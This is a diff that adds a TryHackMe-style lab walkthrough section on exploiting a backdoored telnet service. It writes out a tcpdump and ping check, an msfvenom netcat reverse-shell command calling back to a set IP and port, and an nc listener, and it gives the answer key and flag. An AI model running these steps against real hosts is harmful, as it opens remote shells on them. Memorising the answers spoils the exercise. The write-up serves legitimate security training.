@@ -286,3 +286,126 @@ Skidy
 
 </p>
 </details>
+
+<details><summary>Task 6 - Exploiting Telnet</summary>
+<p>
+	
+## Task 6.1 - no answer needed
+
+### Okay, let's try and connect to this telnet port
+
+## Task 6.2
+
+### Q: Great! It's an open telnet connection. What welcome message do we receive?
+
+<details><summary>Answer</summary>
+<p>
+	
+SKIDY'S BACKDOOR
+
+![](/Network%20Services/images/skidy.png)
+
+</p>
+</details>
+
+## Task 6.3
+
+### Q: Let's try executing some commands. Do we get a returnon any input we enter into the telnet session (Y/N)
+
+<details><summary>Answer</summary>
+<p>
+
+N
+
+![](/Network%20Services/images/run.png)
+
+</p>
+</details>
+
+## Task 6.4 - no answer needed
+
+### Q: That's strange. Let's check to see if what we are typing is being executed as a system command
+
+## Task 6.5 - no answer needed
+
+### Q: Start a tcpdump listener on your local machine using `sudo tcpdump ip proto \\icmp -i tun0` - this starts a tcpdump listener specifically listening for ICMP traffic which ping operates on
+
+## Task 6.6
+
+### Q: Now, use the command `ping [local tun0 ip] -c 1` through the telnet session to see if we are able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)
+
+<details><summary>Answer</summary>
+<p>
+	
+Y
+
+![](/Network%20Services/images/ping.png)
+
+</p>
+</details>
+
+## Task 6.7 - no answer needed
+
+### Q: Great! This means we are able to execute system commands AND that we are able to reach our local machine
+
+## Task 6.8
+
+### Q: We are going to generate a reverse shell payload using msfvenom. This will generate and encode a netcat reverse shell for us. Here's our syntax
+
+	`msfvenom -p cmd/unix/reverse_netcat lhost=10.11.3.112 lport=4444 R`
+
+Flag | Description
+------------ | -------------
+-p | payload
+lhost | our local host IP
+lport | the port to listen on
+R | export the payload in RAW format
+
+What word does the generated payload start with?
+
+<details><summary>Answer</summary>
+<p>
+	
+mkfifo
+
+![](/Network%20Services/images/mkfifo.png)
+
+</p>
+</details>
+
+## Task 6.8
+
+### Q: Perfect. We are nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using
+
+	`nc -vlp [listening port]`
+
+What would the command look like for the listening port we selected?
+
+<details><summary>Answer</summary>
+<p>
+	
+nc -lvp 4444
+
+</p>
+</details>
+
+## Task 6.10 - no answer needed
+
+### Q: Great! Now that's running we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully - this will give us a shell on the target machine
+
+## Task 6.11
+
+### Q: Success! What is the contents of flag.txt?
+
+<details><summary>Answer</summary>
+<p>
+	
+THM{y0u_g0t_th3_t3ln3t_fl4g}
+
+![](/Network%20Services/images/telnet_flag.png)
+
+</p>
+</details>
+
+</p>
+</details>
